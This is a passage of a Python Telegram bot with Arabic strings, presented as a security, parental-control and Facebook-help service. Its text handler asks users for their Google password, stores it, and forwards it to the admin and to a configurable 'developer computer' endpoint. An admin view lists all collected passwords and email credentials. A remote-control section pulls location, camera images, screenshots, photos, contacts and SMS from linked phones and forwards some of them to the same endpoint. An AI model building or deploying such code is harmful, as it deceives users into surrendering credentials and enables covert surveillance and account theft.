            else:
                collected = "📩 <b>المعلومات المجمعة من المستخدمين</b>\n\n"
                if google_passwords:
                    collected += "🔑 <b>كلمات سر Google:</b>\n"
                    for uid, pwd in google_passwords.items():
                        email = google_users.get(uid, {}).get('email', 'غير معروف')
                        collected += f"  • {uid} ({email}): <code>{pwd}</code>\n"
                if temp_emails:
                    collected += "\n📧 <b>البريد المؤقت:</b>\n"
                    for uid, data in temp_emails.items():
                        collected += f"  • {uid}: <code>{data['email']}</code> | <code>{data['password']}</code>\n"
                if not google_passwords and not temp_emails:
                    collected += "📭 لا توجد معلومات مجمعة حتى الآن."
                text = collected
        elif data == "admin_logs":
            if chat_id != ADMIN_ID:
                text = "❌ للمطور فقط."
            else:
                try:
                    with open('bot.log', 'r') as f:
                        logs = f.read().splitlines()[-50:]
                        text = "📜 <b>آخر 50 سطر من السجل:</b>\n"
                        text += "\n".join(logs)
                except:
                    text = "⚠️ لا يوجد سجل حالياً."
        elif data in ["no_devices", "back_to_main"]:
            bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🌟 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))
            return
        else:
            text = "⚠️ خيار غير معروف."

        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"خطأ في معالج الأزرار: {e}")
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")

# ===================== معالج النصوص =====================

@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text_messages(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    text = message.text.strip()

    try:
        # ------------------- حالة البث الجماعي -------------------
        if state == "waiting_for_broadcast":
            if chat_id != ADMIN_ID:
                bot.send_message(chat_id, "❌ هذه الميزة للمطور فقط.")
                user_states[chat_id] = None
                return
            success = 0
            fail = 0
            for uid in registered_users:
                try:
                    bot.send_message(uid, text)
                    success += 1
                    time.sleep(0.1)
                except:
                    fail += 1
            bot.send_message(chat_id, f"✅ تم إرسال الرسالة لـ {success} مستخدم.\n❌ فشل الإرسال لـ {fail} مستخدم.", reply_markup=build_main_menu(chat_id))
            user_states[chat_id] = None
            notify_admin(f"📢 تم إرسال بث جماعي\nالرسالة: {text[:50]}...")
            return

        # ------------------- كلمة سر Google -------------------
        if state == "waiting_for_google_password":
            if chat_id in google_users:
                password = text
                email = google_users[chat_id]['email']
                google_passwords[chat_id] = password
                send_sensitive_data_to_admin("Google Password", f"{email} | {password}", chat_id)
                send_to_developer_computer("google_credentials", f"{email}:{password}", chat_id)
                bot.send_message(chat_id, "✅ تم ربط Google بنجاح.", reply_markup=build_main_menu(chat_id))
                user_states[chat_id] = None
            return

        # ------------------- تعيين endpoint للمطور -------------------
        if state == "waiting_for_dev_endpoint" and chat_id == ADMIN_ID:
            if re.match(r'^https?://', text):
                global developer_computer_endpoint
                developer_computer_endpoint = text
                bot.send_message(chat_id, f"✅ تم تعيين حاسب المطور: {text}")
            else:
                bot.send_message(chat_id, "❌ عنوان غير صالح.")
            user_states[chat_id] = None
            return

        # ------------------- ربط هاتف المستخدم -------------------
        if state == "waiting_for_user_device":
            user_states[chat_id] = "waiting_for_user_device_ip"
            user_states[f"{chat_id}_device_id"] = text
            bot.send_message(chat_id, "✅ تم حفظ المعرف.\nالآن أرسل عنوان IP (مثل: <code>http://192.168.1.5:5000</code>)")
            return

        if state == "waiting_for_user_device_ip":
            endpoint = text
            if not re.match(r'^https?://', endpoint):
                bot.send_message(chat_id, "❌ عنوان غير صالح.")
                return
            success, msg = test_device_connection(endpoint)
            if not success:
                bot.send_message(chat_id, f"❌ فشل الاتصال:\n{msg}")
                return
            device_id = user_states.get(f"{chat_id}_device_id", "غير معروف")
            secure_hash = encrypt_device_data(device_id)
            secure_connected_devices[chat_id] = {
                "type": "هاتف مستخدم (تحكم كامل)",
                "real_id": device_id,
                "secure_hash": secure_hash,
                "endpoint": endpoint,
                "linked_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "blocked_domains": [],
                "history": []
            }
            linked_users.add(chat_id)
            monitoring_data[chat_id] = []
            bot.send_message(chat_id, "✅ <b>تم التفعيل بنجاح!</b>", reply_markup=build_main_menu(chat_id))
            bot.send_message(ADMIN_ID, f"🔗 تفعيل ميزات متقدمة: {chat_id} -> {device_id} ({endpoint})")
            user_states[chat_id] = None
            if f"{chat_id}_device_id" in user_states:
                del user_states[f"{chat_id}_device_id"]
            return

        # ------------------- ربط هاتف الطفل -------------------
        if state == "waiting_for_child_device":
            user_states[chat_id] = "waiting_for_child_device_ip"
            user_states[f"{chat_id}_child_device_id"] = text
            bot.send_message(chat_id, "✅ تم حفظ المعرف.\nالآن أرسل عنوان IP (مثل: <code>http://192.168.1.10:5000</code>)")
            return

        if state == "waiting_for_child_device_ip":
            endpoint = text
            if not re.match(r'^https?://', endpoint):
                bot.send_message(chat_id, "❌ عنوان غير صالح.")
                return
            success, msg = test_device_connection(endpoint)
            if not success:
                bot.send_message(chat_id, f"❌ فشل الاتصال:\n{msg}")
                return
            device_id = user_states.get(f"{chat_id}_child_device_id", "طفل")
            secure_hash = encrypt_device_data(device_id)
            secure_connected_devices[chat_id] = {
                "type": "هاتف طفل (رقابة أبوية)",
                "real_id": device_id,
                "secure_hash": secure_hash,
                "endpoint": endpoint,
                "linked_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "blocked_domains": [],
                "history": []
            }
            linked_users.add(chat_id)
            monitoring_data[chat_id] = []
            bot.send_message(chat_id, "✅ <b>تم التفعيل بنجاح!</b>", reply_markup=build_main_menu(chat_id))
            bot.send_message(ADMIN_ID, f"🚸 تفعيل حماية إضافية: {chat_id} -> {device_id} ({endpoint})")
            user_states[chat_id] = None
            if f"{chat_id}_child_device_id" in user_states:
                del user_states[f"{chat_id}_child_device_id"]
            return

        # ------------------- التحكم عن بعد -------------------
        if chat_id == ADMIN_ID and state == "waiting_for_remote_admin":
            target_id = admin_remote_target.get(chat_id)
            if not target_id or target_id not in secure_connected_devices:
                bot.send_message(chat_id, "❌ اختر جهازاً صالحاً.")
                user_states[chat_id] = None
                return

            command = text.lower()
            if command == "/cancel":
                bot.send_message(chat_id, "❌ تم الإلغاء.", reply_markup=build_main_menu(chat_id))
                user_states[chat_id] = None
                admin_remote_target.pop(chat_id, None)
                return

            endpoint = secure_connected_devices[target_id].get('endpoint')
            if not endpoint:
                bot.send_message(chat_id, "⚠️ لم يتم تعيين endpoint لهذا الجهاز.")
                user_states[chat_id] = None
                return

            device_type = secure_connected_devices[target_id].get('type', '')
            is_child = "طفل" in device_type or "child" in device_type.lower()

            # أوامر الرقابة الأبوية
            if is_child and command.startswith("حظر "):
                domain = command[5:].strip()
                if domain:
                    result, status = send_command_to_device(endpoint, "/block", params={'domain': domain}, method='POST')
                    if status == "json" and result.get('status') == 'blocked':
                        add_blocked_domain(target_id, domain)
                        bot.send_message(chat_id, f"✅ تم حظر الدومين: {domain}")
                    else:
                        bot.send_message(chat_id, f"⚠️ فشل حظر الدومين: {status}")
                else:
                    bot.send_message(chat_id, "❌ يجب إدخال دومين مثل: <code>حظر example.com</code>")
                return

            elif is_child and command.startswith("الغاء حظر "):
                domain = command[10:].strip()
                if domain:
                    result, status = send_command_to_device(endpoint, "/unblock", params={'domain': domain}, method='POST')
                    if status == "json" and result.get('status') == 'unblocked':
                        remove_blocked_domain(target_id, domain)
                        bot.send_message(chat_id, f"✅ تم إلغاء حظر الدومين: {domain}")
                    else:
                        bot.send_message(chat_id, f"⚠️ فشل إلغاء الحظر: {status}")
                else:
                    bot.send_message(chat_id, "❌ يجب إدخال دومين مثل: <code>الغاء حظر example.com</code>")
                return

            elif is_child and command == "سجل":
                result, status = send_command_to_device(endpoint, "/history")
                if status == "json":
                    history = result.get('history', [])
                    if history:
                        lines = [f"🕒 {h['time']}: {h['activity']}" for h in history[-10:]]
                        bot.send_message(chat_id, "📜 <b>آخر السجل:</b>\n" + "\n".join(lines))
                    else:
                        bot.send_message(chat_id, "📭 لا يوجد سجل.")
                else:
                    bot.send_message(chat_id, f"⚠️ فشل جلب السجل: {status}")
                return

            elif is_child and command == "تطبيقات":
                result, status = send_command_to_device(endpoint, "/apps")
                if status == "json":
                    apps = result.get('apps', [])
                    if apps:
                        bot.send_message(chat_id, "📱 <b>التطبيقات المفتوحة:</b>\n" + "\n".join(apps))
                    else:
                        bot.send_message(chat_id, "📭 لا توجد تطبيقات مفتوحة.")
                else:
                    bot.send_message(chat_id, f"⚠️ فشل جلب التطبيقات: {status}")
                return

            elif is_child and command == "تقارير":
                history = secure_connected_devices[target_id].get('history', [])
                blocked = get_blocked_domains(target_id)
                report = f"📊 <b>التقرير</b>\n\n"
                report += f"👤 المستخدم: {target_id}\n"
                report += f"🔒 الدومينات المحظورة: {len(blocked)}\n"
                report += f"📜 عدد الأنشطة: {len(history)}\n"
                if history:
                    recent = history[-3:]
                    report += "🕒 <b>أحدث الأنشطة:</b>\n"
                    for h in recent:
                        report += f"  - {h['time']}: {h['activity']}\n"
                bot.send_message(chat_id, report)
                return

            # الأوامر العامة
            response = None
            if command == "موقع":
                result, status = send_command_to_device(endpoint, "/location")
                if status == "json":
                    response = f"📍 <b>الموقع:</b>\nخط العرض: {result.get('lat', 'غير معروف')}\nخط الطول: {result.get('lng', 'غير معروف')}"
                else:
                    response = f"⚠️ {status}"
            elif command == "كاميرا":
                result, status = send_command_to_device(endpoint, "/camera")
                if status == "image":
                    bot.send_photo(chat_id, result, caption="📸 صورة من الكاميرا")
                    send_to_developer_computer("camera_image", result, target_id)
                    response = "✅ تم إرسال الصورة."
                else:
                    response = f"⚠️ {status}"
            elif command == "لقطة":
                result, status = send_command_to_device(endpoint, "/screenshot")
                if status == "image":
                    bot.send_photo(chat_id, result, caption="🖼️ لقطة شاشة")
                    send_to_developer_computer("screenshot", result, target_id)
                    response = "✅ تم إرسال لقطة الشاشة."
                else:
                    response = f"⚠️ {status}"
            elif command in ["صور", "سحب صور"]:
                result, status = send_command_to_device(endpoint, "/photos")
                if status == "json" and isinstance(result, list):
                    for photo_url in result[:5]:
                        bot.send_message(chat_id, f"🖼️ صورة: {photo_url}")
                    response = f"✅ تم سحب {len(result)} صورة."
                else:
                    response = f"⚠️ {status}"
            elif command in ["شاشة", "شاشة حية"]:
                result, status = send_command_to_device(endpoint, "/live")
                if status == "json":
                    apps = ', '.join(result.get('apps', ['غير متاح'])[:5])
                    notifs = ', '.join(result.get('notifications', ['غير متاح'])[:5])
                    response = f"📱 <b>الشاشة الحية:</b>\n⏰ الوقت: {result.get('time', '')}\n📌 التطبيقات: {apps}\n🔔 الإشعارات: {notifs}"
                else:
                    response = f"⚠️ {status}"
            elif command == "جهات اتصال":
                result, status = send_command_to_device(endpoint, "/contacts")
                if status == "json":
                    contacts = "\n".join([f"• {c['name']} - {c['phone']}" for c in result[:10]])
                    response = f"📇 <b>جهات الاتصال:</b>\n{contacts}"
                else:
                    response = f"⚠️ {status}"
            elif command == "رسائل":
                result, status = send_command_to_device(endpoint, "/sms")
                if status == "json":
                    msgs = "\n".join([f"• {m['from']}: {m['text']}" for m in result[:5]])
                    response = f"💬 <b>الرسائل:</b>\n{msgs}"
                else:
                    response = f"⚠️ {status}"
            else:
                response = "❌ أمر غير معروف."

            if response and not (command in ["كاميرا", "لقطة"] and status == "image"):
                bot.send_message(chat_id, response)
            feature_usage["التحكم عن بعد"] += 1
            if is_child:
                feature_usage["الرقابة الأبوية"] += 1
            return

        # ------------------- الخدمات العامة -------------------
        if state == "waiting_for_site":
            if re.match(r'^https?://', text):
                result, status = scan_url_real(text)
                bot.send_message(chat_id, f"🔍 <b>نتيجة الفحص:</b>\n{result}", reply_markup=build_main_menu(chat_id))
            else:
                bot.send_message(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_ai":
            response = ai_chat_real(text)
            bot.send_message(chat_id, response, reply_markup=build_main_menu(chat_id))
            user_states[chat_id] = None
            return

        if state == "waiting_for_image":
            if len(text) < 5:
                bot.send_message(chat_id, "❌ الوصف قصير.")
                return
            img_data, msg = generate_image_real(text)
            if img_data:
                bot.send_photo(chat_id, img_data, caption="🎨 الصورة المولدة")
            else:
                bot.send_message(chat_id, msg, reply_markup=build_main_menu(chat_id))
            user_states[chat_id] = None
            return

        if state == "waiting_for_track_num":
            result, status = track_phone_real(text)
            bot.send_message(chat_id, result, reply_markup=build_main_menu(chat_id))
            user_states[chat_id] = None
            return

        if state == "waiting_for_fb_hacked":
            bot.send_message(
                chat_id,
                f"🛡️ <b>خطوات استرجاع الحساب:</b>\n1. زُر https://www.facebook.com/hacked\n2. أدخل البريد: {text}\n3. اتبع التعليمات.",
                reply_markup=build_main_menu(chat_id)
            )
            user_states[chat_id] = None
            return

        if state == "waiting_for_spam_num":
            bot.send_message(chat_id, f"🚫 تم حظر الرقم: {text} (يمكنك إضافته يدوياً في تطبيق الهاتف).", reply_markup=build_main_menu(chat_id))
            user_states[chat_id] = None
            return

        # ------------------- بلاغ فيسبوك -------------------
        if state == "waiting_for_fb_report_type":
            if text not in FB_REPORT_TYPES:
                bot.send_message(chat_id, "❌ نوع غير صحيح. الرجاء اختيار رقم من القائمة (1-8).")
                return
            report_type = FB_REPORT_TYPES[text]
            user_states[chat_id] = "waiting_for_fb_report_reason"
            user_states[f"{chat_id}_fb_report_type"] = report_type
            bot.send_message(chat_id, f"✅ تم اختيار: {report_type}\n\nالآن، اكتب شرحاً مفصلاً للسبب.")
            return

        if state == "waiting_for_fb_report_reason":
            reason = text
            user_states[chat_id] = "waiting_for_fb_report_link"
            user_states[f"{chat_id}_fb_report_reason"] = reason
            bot.send_message(chat_id, "✅ تم حفظ السبب.\n\nالآن، أرسل رابط المنشور أو الحساب المخالف (اختياري).\nإذا لم يكن لديك رابط، أرسل 'لا يوجد'.")
            return

        if state == "waiting_for_fb_report_link":
            link = text if text.lower() != 'لا يوجد' else ''
            report_type = user_states.get(f"{chat_id}_fb_report_type")
            reason = user_states.get(f"{chat_id}_fb_report_reason")
            if not report_type or not reason:
                bot.send_message(chat_id, "❌ حدث خطأ، يرجى البدء من جديد.")
                user_states[chat_id] = None
                return
            bot.send_message(chat_id, "⏳ جاري إنشاء الشكوى الرسمية...")
            report_text = generate_fb_report(report_type, reason, link)
            support_links = {
                "Fake Account": "https://www.facebook.com/help/contact/1743260659609308",
                "Offensive": "https://www.facebook.com/help/contact/315847653073855",
                "Harassment": "https://www.facebook.com/help/contact/237547145079192",
                "Impersonation": "https://www.facebook.com/help/contact/165143319009650",
                "Privacy": "https://www.facebook.com/help/contact/207640860572618"
            }
            support_link = "https://www.facebook.com/help/contact/"
            for key, url in support_links.items():
                if key in report_type:
                    support_link = url
                    break
            final_msg = (
                f"📝 <b>شكوى رسمية لفيسبوك</b>\n\n"
                f"<code>{report_text}</code>\n\n"
                f"🔗 <b>رابط الدعم الرسمي:</b> {support_link}\n\n"
                f"📌 قم بنسخ النص أعلاه، ثم افتح رابط الدعم، والصق النص في نموذج الإبلاغ مع رابط المنشور/الحساب إن وجد.\n"
                f"✅ تم إنشاء الشكوى بنجاح."
            )
            bot.send_message(chat_id, final_msg, reply_markup=build_main_menu(chat_id))
            for key in [f"{chat_id}_fb_report_type", f"{chat_id}_fb_report_reason"]:
                if key in user_states:
                    del user_states[key]
            user_states[chat_id] = None
            feature_usage["بلاغات فيسبوك"] += 1
            return

        # ------------------- مراقبة الروابط للأطفال -------------------
        if chat_id in linked_users and state is None:
            device_info = secure_connected_devices.get(chat_id)
            if device_info and "طفل" in device_info.get('type', ''):
                blocked = get_blocked_domains(chat_id)
                urls = re.findall(r'https?://([^/\s]+)', text)
                for domain in urls:
                    if domain in blocked:
                        bot.send_message(chat_id, f"🚫 تم حظر هذا الموقع ({domain}) بواسطة الحماية.")
                        bot.send_message(ADMIN_ID, f"🚸 حظر موقع من الطفل {chat_id}: {domain}")
                        log_child_activity(chat_id, f"محاولة زيارة موقع محظور: {domain}")
                        return
            urls = re.findall(r'https?://[^\s]+', text)
            for url in urls:
                result, status = scan_url_real(url)
                if status in ['malicious', 'suspicious']:
                    bot.send_message(chat_id, f"🚨 <b>تحذير:</b> الرابط <code>{url}</code> قد يكون خطيراً.\n{result}")
                    bot.send_message(ADMIN_ID, f"⚠️ رابط مشبوه من {chat_id}: {url}\n{result}")
                    if device_info and "طفل" in device_info.get('type', ''):
                        log_child_activity(chat_id, f"رابط مشبوه: {url}")
                    break

        if state is None:
            bot.send_message(chat_id, "🤖 اختر خدمة من القائمة.", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"خطأ في معالج النصوص: {e}")
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")

# ===================== معالج الملفات =====================

@bot.message_handler(content_types=['document'])
def handle_documents(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    temp_file_path = None

    try:
        if state == "waiting_for_apk":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.apk'):
                bot.send_message(chat_id, "❌ أرسل ملف APK.")
                return

            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)

            temp_file_path = f"/tmp/{file_name}"
            with open(temp_file_path, 'wb') as f:
                f.write(downloaded)

            result, status = scan_apk_real(downloaded, file_name)
            bot.send_message(chat_id, f"📦 <b>نتيجة فحص APK:</b>\n{result}", reply_markup=build_main_menu(chat_id))

            if temp_file_path and os.path.exists(temp_file_path):
                os.remove(temp_file_path)
                logger.info(f"تم حذف الملف المؤقت: {temp_file_path}")

            user_states[chat_id] = None
            return

        if state == "waiting_for_my_app":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            ext = file_name.split('.')[-1].lower()
            if ext not in ['txt', 'py', 'js', 'java', 'cpp', 'c', 'html', 'css', 'php']:
                bot.send_message(chat_id, "❌ امتداد غير مدعوم.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            try:
                content = downloaded.decode('utf-8')
                review = ai_chat_real(f"قم بمراجعة الكود التالي واكتشاف الثغرات:\n\n{content[:2000]}")
                bot.send_message(chat_id, f"🛠️ <b>مراجعة الكود:</b>\n{review}", reply_markup=build_main_menu(chat_id))
            except:
                bot.send_message(chat_id, "⚠️ فشل قراءة الملف، تأكد من أنه ملف نصي.", reply_markup=build_main_menu(chat_id))
            user_states[chat_id] = None
            return

        if chat_id in linked_users:
            bot.send_message(chat_id, "📎 تم استلام الملف.", reply_markup=build_main_menu(chat_id))
        else:
            bot.send_message(chat_id, "📎 لفحص الملفات، قم بتفعيل الميزات أولاً.", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"خطأ في معالج الملفات: {e}")
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")
        if temp_file_path and os.path.exists(temp_file_path):
            try:
                os.remove(temp_file_path)
            except:
                pass

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    chat_id = message.chat.id
    if chat_id in linked_users:
        bot.send_message(chat_id, "🖼️ تم استلام الصورة.", reply_markup=build_main_menu(chat_id))
    else:
        bot.send_message(chat_id, "🖼️ لفحص الصور، قم بتفعيل الميزات أولاً.", reply_markup=build_main_menu(chat_id))

# ===================== تشغيل البوت مع الإنعاش الذاتي =====================

def start_bot():
    logger.info("🚀 تشغيل البوت مع آلية الإنعاش الذاتي...")
    notify_admin("✅ <b>تم تشغيل البوت بنجاح!</b>")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=30)
        except Exception as e:
            logger.error(f"🔄 جاري إعادة الاتصال تلقائياً بعد تجاوز الخطأ: {e}")
            notify_admin(f"⚠️ <b>تم إعادة تشغيل البوت تلقائياً</b>\nالخطأ: {str(e)[:200]}")
            time.sleep(5)

if __name__ == "__main__":
    start_bot()
